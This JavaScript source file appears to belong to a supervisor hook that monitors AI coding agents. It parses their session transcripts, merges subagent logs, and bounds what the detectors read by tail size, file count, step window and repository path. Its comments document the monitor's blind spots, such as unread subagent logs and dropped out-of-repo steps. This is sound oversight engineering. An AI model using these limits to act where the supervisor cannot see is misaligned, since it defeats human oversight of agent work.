 * NOT verified against real CodeBuddy logs — see NOT_CHECKED.
 */
export function makeGenericStructuredParser() {
  return {
    feed(line) {
      const obj = typeof line === "string" ? tryJSON(line) : line;
      if (!obj || typeof obj !== "object") return eventsFromTranscriptLine(line);
      const cmd = deepFind(obj, ["command", "cmd", "exec", "shell"]);
      const name = deepFind(obj, ["tool_name", "tool", "name", "function"]);
      const output = deepFind(obj, ["output", "stdout", "result", "content", "text"]);
      const exitRaw = deepFind(obj, ["exit_code", "exitCode", "returncode", "exit", "status"]);
      if (cmd != null || (name != null && EDIT_TOOLS.has(String(name)))) {
        const call = classifyToolCall(String(name ?? ""), { command: String(cmd ?? "") });
        const exit = typeof exitRaw === "number" ? (exitRaw === 0 ? 0 : 1)
          : (call.isTest ? testExitFromOutput(output) : null);
        return [{ ...call, exit, observation: keepObs(output, call.isTest) }];
      }
      return eventsFromTranscriptLine(line);      // unfamiliar shape → heuristic, no regression
    },
  };
}

/* the parser for an agent (stateful; create one per session/tail) */
export function makeSessionParser(agent) {
  if (agent === "claude-code") return makeClaudeCodeParser();
  if (agent === "codex") return makeCodexParser();
  if (agent === "codebuddy") return makeGenericStructuredParser();
  return { feed: (line) => eventsFromTranscriptLine(line) };   // trae / unknown → heuristic
}

/*
 * trajectoryFromTranscript — reconstruct the run so far from a session file, read
 * with the agent's structured parser (falls back to heuristic per line).
 */
export function trajectoryFromTranscript(path, agent = "claude-code",
  { tailBytes = TAIL_BYTES, origin = "main", into = null } = {}) {
  if (!path) return [];
  const text = readTail(path, tailBytes);
  if (!text) return [];
  const parser = makeSessionParser(agent);
  const steps = [];
  const acc = into
    ? (into.usage ? into
      : Object.assign(into, { usage: emptyUsage(), turns: 0, operator: [], boundaries: [] }))
    : null;
  for (const line of text.split(/\r?\n/)) {
    if (!line.trim()) continue;
    if (acc) {
      usageFromLine(line, acc);
      /* collected in the SAME pass. These are two more things that live in the
         transcript and were being ignored; re-opening a multi-megabyte file to
         find them is the quadratic habit this reader already had once. */
      const t = operatorTurnFromLine(line);
      if (t) acc.operator.push(t);
      pushBoundary(acc.boundaries, boundaryFromLine(line));
    }
    /* ORDERING FUEL. Merging several logs needs a clock, and re-parsing each line
       as JSON to get one field would double the parse cost of the hot path on
       every hook call. The escaped form inside a tool_result body is
       \"timestamp\":\" — the unescaped pattern below cannot match it, so a
       transcript that merely QUOTES a timestamp does not get stamped with it. */
    const m = TS_RE.exec(line);
    const ts = m ? Date.parse(m[1]) || null : null;
    for (const ev of parser.feed(line)) steps.push({ ...ev, ts, origin });
  }
  return steps;
}

const TS_RE = /"timestamp":"(\d{4}-\d{2}-\d{2}T[\d:.]+Z?)"/;

/*
 * THE FOREMAN WAS WATCHING ONE MACHINE ON A FLOOR OF SIX
 * =====================================================
 * Measured on this repo's own session: the main transcript held 375 tool calls
 * and six subagent transcripts held another 326. 46.5% of the work happened
 * where the supervisor could not see it — and every signal downstream (whack-a-
 * mole, charter scope, repetition) was being computed on the visible half while
 * reading as if it covered the run.
 *
 * It was never a parsing problem. Pointed straight at one of those files the
 * existing adapter returns all 79 steps. The hook simply read the single
 * `transcript_path` it was handed and never looked in the directory beside it.
 *
 * DISCOVERY IS BY PATH CONVENTION, NOT BY LINK. Worth being exact, because an
 * earlier note in this repo got it wrong: the parent log does NOT reference its
 * children. (The paths appear in that log only because a `find` was run inside
 * the session — evidence produced by the investigation, not by the host.) The
 * host's layout is:
 *
 *     <dir>/<sessionId>.jsonl                     ← parent
 *     <dir>/<sessionId>/subagents/agent-*.jsonl   ← children
 *
 * so the set is reachable from EITHER end. That matters because a hook firing
 * inside a subagent is handed the child's path, and it should still get the
 * fleet view rather than the narrowest one.
 */
export function discoverFleetLogs(transcriptPath, { maxFiles = 8 } = {}) {
  const p = String(transcriptPath ?? "");
  if (!p.endsWith(".jsonl")) return { parent: p || null, subagents: [] };
  const slash = p.lastIndexOf("/");
  const dir = slash < 0 ? "." : p.slice(0, slash);
  const base = p.slice(slash + 1, -6);                       // strip ".jsonl"

  /* which end are we standing on? */
  const inSub = dir.endsWith("/subagents");
  const sessionDir = inSub ? dir.slice(0, -"/subagents".length) : `${dir}/${base}`;
  const parent = inSub ? `${sessionDir}.jsonl` : p;
  const subDir = `${sessionDir}/subagents`;

  let subagents = [];
  try {
    if (existsSync(subDir)) {
      subagents = readdirSync(subDir)
        .filter((f) => f.endsWith(".jsonl"))
        .map((f) => `${subDir}/${f}`)
        /* most recently touched first: a long session can accumulate more
           children than we will ever read, and the ones that matter to the
           decision being made right now are the ones still being written */
        .map((f) => { try { return { f, m: statSync(f).mtimeMs }; } catch { return { f, m: 0 }; } })
        .sort((a, b) => b.m - a.m).slice(0, maxFiles).map((x) => x.f);
    }
  } catch { subagents = []; }
  return { parent: existsSync(parent) ? parent : (inSub ? null : p), subagents };
}

/*
 * trajectoryFromSession — the whole floor, in one time-ordered list.
 *
 * Every step carries `origin`: "main" for the parent, "sub:<id>" for a child.
 * Nothing downstream is forced to use it, and that is deliberate — visibility
 * arrives before authority. The detectors that already have real-traffic
 * numbers keep judging their own agent's chain (see `ownChain`), so this change
 * cannot invent an interruption that yesterday's calibration never saw. What
 * the fleet view is allowed to do today is DISCLOSE.
 *
 * Steps with no readable timestamp keep their within-file order and sort after
 * the stamped ones from the same file, which is the honest fallback: we never
 * pretend to know an interleaving we could not read.
 */
export function trajectoryFromSession(transcriptPath, agent = "claude-code",
  { tailBytes = TAIL_BYTES, maxFiles = 8, subTailBytes = null, fleet = true,
    usageByOrigin = null } = {}) {
  if (!transcriptPath) return [];
  if (!fleet) return trajectoryFromTranscript(transcriptPath, agent, { tailBytes });

  const { parent, subagents } = discoverFleetLogs(transcriptPath, { maxFiles });
  const self = String(transcriptPath);
  const subBytes = subTailBytes ?? Math.max(64 * 1024, Math.floor(tailBytes / 2));
  const bucket = (o) => {
    if (!usageByOrigin) return null;
    const b = {}; usageByOrigin[o] = b; return b;
  };

  const lists = [];
  if (parent) {
    lists.push(trajectoryFromTranscript(parent, agent,
      { tailBytes, origin: "main", into: bucket("main") }));
  }
  for (const f of subagents) {
    if (parent && f === parent) continue;
    const id = f.slice(f.lastIndexOf("/") + 1).replace(/\.jsonl$/, "");
    lists.push(trajectoryFromTranscript(f, agent,
      { tailBytes: f === self ? tailBytes : subBytes, origin: `sub:${id}`, into: bucket(`sub:${id}`) }));
  }

  /* stable merge: index inside its own file breaks ties, so an unstamped run of
     steps never gets shuffled against itself */
  const flat = [];
  for (const list of lists) list.forEach((s, i) => flat.push({ s, i }));
  flat.sort((a, b) => {
    const at = a.s.ts, bt = b.s.ts;
    if (at != null && bt != null && at !== bt) return at - bt;
    if (at == null && bt != null) return 1;
    if (at != null && bt == null) return -1;
    return a.i - b.i;
  });
  return flat.map((x) => x.s);
}

/* the chain the supervisor is entitled to JUDGE: the agent whose tool call we
   were invoked for. Everything else on the floor is context, not evidence
   against this worker. */
export const ownChain = (steps = [], origin = "main") =>
  steps.filter((s) => (s.origin ?? "main") === origin);

/* which origin is the hook standing in, given the path it was handed */
export function originOf(transcriptPath) {
  const p = String(transcriptPath ?? "");
  if (!/\/subagents\/[^/]+\.jsonl$/.test(p)) return "main";
  return `sub:${p.slice(p.lastIndexOf("/") + 1).replace(/\.jsonl$/, "")}`;
}

/*
 * TAIL READ.
 *
 * The hook is invoked once per tool call and used to `readFileSync` the entire
 * transcript every time. A session's transcript only grows, so the cost of
 * supervising step N was proportional to N, and the cost of a whole session was
 * quadratic. Measured on this repo: 500 calls → 737ms, 2000 → 10.8s, 4000 →
 * 42.1s, against a 30s host timeout. Past that the hook is killed mid-call, and
 * because a killed hook is a non-blocking error, it fails SILENTLY: the operator
 * sees a session that gets slower and slower and is never told why.
 *
 * A supervisor whose cost grows with the length of the thing it supervises will
 * always eventually be uninstalled. Read a bounded tail instead. The first line
 * is dropped because a byte offset lands mid-line; a tool_result whose tool_use
 * fell outside the window simply stays unpaired, which the parser already
 * handles (it yields nothing for an id it has not seen).
 */
const TAIL_BYTES = 512 * 1024;

function readTail(path, maxBytes = TAIL_BYTES) {
  let fd = null;
  try {
    if (!existsSync(path)) return "";
    const { size } = statSync(path);
    if (size <= maxBytes) return readFileSync(path, "utf8");
    fd = openSync(path, "r");
    const buf = Buffer.allocUnsafe(maxBytes);
    readSync(fd, buf, 0, maxBytes, size - maxBytes);
    const text = buf.toString("utf8");
    const nl = text.indexOf("\n");
    return nl === -1 ? "" : text.slice(nl + 1);     // drop the partial first line
  } catch { return ""; }
  finally { if (fd != null) { try { closeSync(fd); } catch { /* ignore */ } } }
}

/*
 * SCOPE — a session is not a task.
 *
 * The trajectory was rebuilt from the whole transcript with no bound in either
 * direction. Observed in a real session: it told the agent, repeatedly and
 * specifically, that "the problem is in /tmp/moletest/src/rate.js" — an
 * experiment that had finished an hour earlier in a different checkout. Work
 * three hours and it will hand you hour one's bug, with enough detail to be
 * believed.
 *
 * Two bounds. RECENT: the last N steps, sized to one task rather than one day.
 * SAME-REPO: drop steps whose only absolute paths belong to another checkout.
 * Steps that name no path are KEPT — dropping them would cut the failing rounds
 * the loop detector counts on, and a detector fed a gapped history reports a
 * clean run, which is the worst thing it can say.
 */
const ABS_PATH = /(?:^|[\s"'(=])((?:\/|~\/)[\w.\-+@/]{3,})/g;

export function scopeTrajectory(steps = [], { cwd = null, window = 120 } = {}) {
  let out = steps;
  if (cwd) {
    const root = String(cwd).replace(/\/+$/, "");
    out = out.filter((s) => {
      const text = `${s.action ?? ""} ${s.target ?? ""}`;
      const paths = [...text.matchAll(ABS_PATH)].map((m) => m[1]);
      if (!paths.length) return true;                       // no path named ⇒ keep
      return paths.some((p) => p.startsWith(root) || !p.startsWith("/"));
    });
  }
  return window > 0 && out.length > window ? out.slice(-window) : out;
}
